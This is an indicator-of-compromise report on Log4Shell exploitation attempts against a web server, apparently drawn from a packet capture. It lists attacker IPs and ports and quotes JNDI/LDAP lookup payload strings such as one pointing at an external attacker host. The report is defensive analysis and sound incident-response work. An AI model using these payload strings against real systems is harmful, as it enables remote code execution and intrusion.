# IOC Analysis – Log4Shell Investigation

## Victim

- IP Address: `198.71.247.91`
- Asset Type: Public-facing web server

---

## Primary Attacker

### IP Address

`195.54.160.149`

### Observed Activity

- 59 HTTP requests
- Requests targeted `/`
- 5 JNDI-containing packets
- Hosted/referenced LDAP infrastructure on port `12344`
- Referenced second-stage retrieval infrastructure on port `5874`

### Threat Intelligence

At the time of investigation, VirusTotal showed **14 vendor detections** for this IP.

---

## Additional JNDI Source

`49.7.224.217`

This source generated four HTTP GET requests containing JNDI-related payloads.

---

## Referenced LDAP Infrastructure

`45.83.193.150:1389`

Observed inside a malicious JNDI payload:

`${jndi:ldap://45.83.193.150:1389/Exploit}`

The IP was referenced inside the payload and was not the source IP of that HTTP request.

---

## Primary JNDI Infrastructure

`195.54.160.149:12344`

Observed in:

`${jndi:ldap://195.54.160.149:12344/...}`

No callback traffic to this port was observed in the PCAP.

---

## Second-Stage Infrastructure

`195.54.160.149:5874`

Identified after decoding the embedded Base64 command.

The intended command attempted to retrieve content from this service using `curl` or `wget`.

No connection to port `5874` was observed in the PCAP.

---

## Exploit Pattern

`${jndi:ldap://...}`

This pattern was observed in HTTP traffic targeting the web server and is associated with Log4Shell/JNDI exploitation attempts.

---

## IOC Summary

| Type | Indicator | Assessment |
|---|---|---|
| IP | `195.54.160.149` | Primary attack infrastructure |
| IP | `49.7.224.217` | Additional attack source |
| IP | `45.83.193.150` | Referenced LDAP infrastructure |
| Port | `12344` | JNDI/LDAP callback target |
| Port | `5874` | Intended second-stage retrieval |
| Pattern | `${jndi:ldap://...}` | Log4Shell exploit indicator |

---

## Assessment

The indicators demonstrate active Log4Shell exploitation attempts against the victim web server.

The absence of observed callback traffic to the attacker's LDAP and second-stage infrastructure means successful exploitation cannot be confirmed from the available packet capture.